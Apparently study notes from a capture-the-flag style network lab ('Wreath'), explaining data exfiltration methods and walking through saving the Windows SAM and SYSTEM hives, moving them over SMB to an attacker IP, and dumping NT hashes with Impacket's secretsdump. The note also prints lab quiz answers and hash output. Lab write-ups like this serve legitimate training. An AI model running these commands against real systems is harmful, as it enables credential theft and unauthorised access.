Data exfiltration is something that should _never_ be considered without explicit prior consent. Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.  

---

The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can't just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file.

A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.  

In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason *an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP*; however, in an unmonitored network these are still good options for moving files around.

It's worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it's worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.  

---

In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows? Maybe you'll even find a legitimate use for steganography!

As extra reading, [PentestPartners](https://www.pentestpartners.com/) have a superb [blog post](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/) on this topic.

> [!Question]
>1. Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)? 
>`Nay`
>1. For what reason is HTTPS preferred over HTTP during exfiltration?
>`Encryption`



---

Let's put this into practice!

We need some way to prove to Thomas that we've compromised his PC. We could leave a note on his Desktop, or we could be fancy and give him his Administrator password hash to prove that we've rooted it.  

There's no way we're going to get Mimikatz past Defender. We have SYSTEM access, so we could technically just disable Defender, but let's try to do this with as little destructiveness as possible (not least for other users on the network). What we _can_ do is grab the files containing the password hashes, pass them back to our attacking machine, then dump the hashes locally. 

## Linux
On Linux this would be a simple matter of grabbing `/etc/shadow`. 

## Windows
On Windows it is slightly more complex than that.

Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this should not be readable whilst the computer is running. 

### Save the SAM file
To dump the hashes locally, we first need to save the SAM hive:  
`reg.exe save HKLM\SAM sam.bak   `

This saves the hive as a file called "sam.bak" in the current directory.

### Save the SYSTEM file
Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:  
`reg.exe save HKLM\SYSTEM system.bak   `

With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.


It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the `net use` command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:  
`reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak`  
or  
`move sam.bak \\ATTACKING_IP\share\sam.bak   `

> [!Note]
>You may encounter an error when reconnecting. This is due to the way that Windows handles cached credentials.
>_![[52376f416ede.png]]
>System error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying_ `/USER:domain\user` _rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection._

With both files stored locally, we can now dump some hashes! Make sure you delete the .bak files from the target if you copied them rather than moving them.

Once again, remember to disconnect from the SMB server!


---


## Dumping the hashes

There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: `secretsdump.py` .

Let's use this against our dumped hives:  
`python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL`

![[28853bc2be23.png]]

Each local account on the target is shown here, in a format of Username, RID, LM hash, NT hash -- separated by colons. 
We are interested in the _NT_ hashes -- the last section (blurred). As a side note: `31d6cfe0d16ae931b73c59d7e0c089c0` is an empty hash, and indicates that the account is not activated. These can thus be discounted.

---

# Your job

1. #Attacking_Machine 
	Start up a temporary SMB server.
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

2. #Reverse_Shell 
	Dump the SAM hive.
```
reg.exe save HKLM\SAM sam.bak
```

3. #Reverse_Shell 
	Dump the SYSTEM hive.
```
reg.exe save HKLM\SYSTEM system.bak
```

4. #Reverse_Shell 
	Connect to the SMB server.
```
net use \\10.50.85.33\share /USER:user s3cureP@ssword
```

5. #Reverse_Shell 
	Data exfiltration.
```
move sam.bak \\10.50.85.33\share\sam.bak

move system.bak \\10.50.85.33\share\system.bak
```

6. #Reverse_Shell 
	Disconnect from the SMB server.
```
net use \\10.50.85.33\share /del
```

7. #Attacking_Machine 
	Dump the hashes.
```
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<font color="#92d050">a05c3c807ceeb48c47252568da284cd2</font>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up... 


> [!Question]
>What is the Administrator NT hash for this target?
>`a05c3c807ceeb48c47252568da284cd2`

We have now completed everything we set out to accomplish: demonstrating that Wreath's network is vulnerable. Take this chance to go through the network and clean up after yourself. Aside from being courteous to other users of the network, this is also something you should always do in real life; we wouldn't want to make things easy for an attacker, would we?  

Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.


**Next step:**  [[Debrief & Report]]
